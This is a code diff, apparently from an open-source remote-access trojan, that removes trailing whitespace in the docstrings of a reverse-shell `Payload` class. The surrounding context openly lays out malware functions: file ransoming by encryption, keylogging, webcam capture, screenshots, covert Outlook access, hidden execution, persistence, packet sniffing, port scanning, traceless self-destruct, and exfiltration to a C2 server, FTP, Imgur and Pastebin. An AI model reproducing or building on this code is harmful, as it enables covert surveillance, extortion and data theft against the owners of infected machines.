@@ -37,7 +37,7 @@ def log(info, level='debug'):
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
 
 def config(*arg, **options):
-    """ 
+    """
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
     """
     def _config(function):
@@ -51,7 +51,7 @@ def config(*arg, **options):
     return _config
 
 def threaded(function):
-    """ 
+    """
     Decorator for making a function threaded
 
     `Required`
@@ -70,7 +70,7 @@ _abort = False
 _debug = '--debug' in sys.argv
 
 class Payload():
-    """ 
+    """
     Reverse TCP shell designed to provide remote access
     to the host's terminal, enabling direct control of the
     device from a remote server.
@@ -78,7 +78,7 @@ class Payload():
     """
 
     def __init__(self, host='127.0.0.1', port=1337, **kwargs):
-        """ 
+        """
         Create a reverse TCP shell instance
 
         `Required`
@@ -208,7 +208,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
-        """ 
+        """
         Change current working directory
 
         `Optional`
@@ -222,7 +222,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
     def ls(self, path='.'):
-        """ 
+        """
         List the contents of a directory
 
         `Optional`
@@ -242,7 +242,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
     def cat(self, path):
-        """ 
+        """
         Display file contents
 
         `Required`
@@ -262,7 +262,7 @@ class Payload():
 
     @config(platfoms=['win32','linux2','darwin'], command=False)
     def ftp(self, source, filetype=None, host=None, user=None, password=None):
-        """ 
+        """
         Upload file/data to FTP server
 
         `Required`
@@ -309,7 +309,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
     def pwd(self, *args):
-        """ 
+        """
         Show name of present working directory
 
         """
@@ -317,7 +317,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
     def eval(self, code):
-        """ 
+        """
         Execute Python code in current context
 
         `Required`
@@ -331,7 +331,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
-        """ 
+        """
         Download file from url as temporary file and return filepath
 
         `Required`
@@ -352,7 +352,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
     def kill(self):
-        """ 
+        """
         Shutdown the current connection and reset session
 
         """
@@ -370,7 +370,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help [cmd]')
     def help(self, name=None):
-        """ 
+        """
         Show usage help for commands and modules
 
         `Optional`
@@ -392,7 +392,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
     def load(self, args):
-        """ 
+        """
         Remotely import a module or package
 
         `Required`
@@ -423,7 +423,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
-        """ 
+        """
         Stop a running job
 
         `Required`
@@ -441,7 +441,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
-        """ 
+        """
         Show value of an attribute
 
         `Required`
@@ -478,7 +478,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
-        """ 
+        """
         Abort tasks, close connection, and self-destruct leaving no trace on the disk
 
         """
@@ -505,7 +505,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
     def unzip(self, path):
-        """ 
+        """
         Unzip a compressed archive/file
 
         `Required`
@@ -523,7 +523,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
     def phone(self, args):
-        """ 
+        """
         Use an online phone to send text messages
 
         `Required`
@@ -531,8 +531,8 @@ class Payload():
         :param str message:   text message to send
 
         `Optional`
-        :param str account:   Twilio account SID 
-        :param str token:     Twilio auth token 
+        :param str account:   Twilio account SID
+        :param str token:     Twilio auth token
         :param str api:       Twilio api key
 
         """
@@ -546,7 +546,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=False)
     def imgur(self, source, api_key=None):
-        """ 
+        """
         Upload image file/data to Imgur
 
         `Required`
@@ -570,7 +570,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
     def upload(self, filename):
-        """ 
+        """
         Upload file from client machine to the C2 server
 
         `Required`
@@ -594,7 +594,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
     def ransom(self, args):
-        """ 
+        """
         Ransom personal files on the client host machine using encryption
 
         `Required`
@@ -608,7 +608,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
     def webcam(self, args=None):
-        """ 
+        """
         View a live stream of the client host machine webcam or capture image/video
 
         `Required`
@@ -617,7 +617,7 @@ class Payload():
         `Optional`
         :param str upload:    imgur (image mode), ftp (video mode)
         :param int port:      integer 1 - 65355 (stream mode)
-        
+
         """
         try:
             if 'webcam' not in globals():
@@ -650,7 +650,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
     def passive(self):
-        """ 
+        """
         Enter passive mode, re-attempting to establish a connection
         with the server every 30 seconds
 
@@ -660,7 +660,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
     def restart(self, output='connection'):
-        """ 
+        """
         Restart the shell
 
         """
@@ -674,7 +674,7 @@ class Payload():
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
     def outlook(self, args=None):
-        """ 
+        """
         Access Outlook email in the background without authentication
 
         `Required`
@@ -715,7 +715,7 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
     def execute(self, args):
-        """ 
+        """
         Run an executable program in a hidden process
 
         `Required`
@@ -723,7 +723,7 @@ class Payload():
 
         `Optional`
         :param str args:    arguments for the target program
-        
+
         """
         path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
         args = [path] + args.split()
@@ -746,7 +746,7 @@ class Payload():
 
     @config(platforms=['win32'], command=True, usage='process <mode>')
     def process(self, args=None):
-        """ 
+        """
         Utility method for interacting with processes
 
         `Required`
@@ -754,7 +754,7 @@ class Payload():
 
         `Optional`
         :param str args:    arguments specific to the mode
-        
+
         """
         try:
             if 'process' not in globals():
@@ -781,13 +781,13 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
     def portscan(self, target=None):
-        """ 
-        Scan a target host or network to identify 
+        """
+        Scan a target host or network to identify
         other target hosts and open ports.
 
         `Required`
         :param str target:      IPv4 address
-        
+
         """
         if 'portscanner' not in globals():
             self.load('portscanner')
@@ -802,7 +802,7 @@ class Payload():
             log("{} error: {}".format(self.portscan.func_name, str(e)))
 
     def pastebin(self, source, api_key=None):
-        """ 
+        """
         Dump file/data to Pastebin
 
         `Required`
@@ -812,13 +812,13 @@ class Payload():
         :param str api_key:     Pastebin api_dev_key
 
         Returns URL of pastebin document as a string
-        
+
         """
         try:
             if api_key:
                 info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
                 paste = globals()['post']('https://pastebin.com/api/api_post.php',data=info)
-                parts = urllib2.urlparse.urlsplit(paste)       
+                parts = urllib2.urlparse.urlsplit(paste)
                 return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
             else:
                 return "{} error: no pastebin API key".format(self.pastebin.func_name)
@@ -827,12 +827,12 @@ class Payload():
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger run/stop/status/upload')
     def keylogger(self, mode=None):
-        """ 
+        """
         Log user keystrokes
 
         `Required`
         :param str mode:    run, stop, status, upload
-        
+
         """
         def status():
             try:
@@ -873,18 +873,18 @@ class Payload():
                 globals()['keylogger'].logs.reset()
                 return 'Keystroke log upload complete'
             elif 'status' in mode:
-                return locals()['status']()        
+                return locals()['status']()
             else:
                 return keylogger.usage
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
     def screenshot(self, mode=None):
-        """ 
+        """
         Capture a screenshot from host device
 
         `Optional`
         :param str mode:   ftp, imgur (default: None)
-        
+
         """
         try:
             if 'screenshot' not in globals():
@@ -896,12 +896,12 @@ class Payload():
             return 'Screenshot complete'
         except Exception as e:
             result = "{} error: {}".format(self.screenshot.func_name, str(e))
-            log(result) 
+            log(result)
             return result
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
-        """ 
+        """
         Establish persistence on client host machine
 
         `Required`
@@ -915,7 +915,7 @@ class Payload():
         :method launch_agent:       Mac OS X Launch Agent
         :method crontab_job:        Linux Crontab Job
         :method hidden_file:        Hidden File
-        
+
         """
         try:
             if not 'persistence' in globals():
@@ -932,12 +932,12 @@ class Payload():
 
     @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
     def packetsniffer(self, args):
-        """ 
+        """
         Capture traffic on local network
 
         `Required`
         :param str args:        run, stop, upload
-        
+
         """
         try:
             if 'packetsniffer' not in globals():
@@ -968,7 +968,7 @@ class Payload():
             log("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
     def send_task(self, task):
-        """ 
+        """
         Send task results to the server
 
         `Task`
@@ -995,7 +995,7 @@ class Payload():
             log("{} error: {}".format(self.send_task.func_name, str(e)))
 
     def recv_task(self):
-        """ 
+        """
         Receive and decrypt incoming task from server
 
         `Task`
@@ -1018,7 +1018,7 @@ class Payload():
             log("{} error: {}".format(self.recv_task.func_name, str(e)))
 
     def run(self):
-        """ 
+        """
         Connect back to server via outgoing connection
         and initialize a reverse TCP shell
 
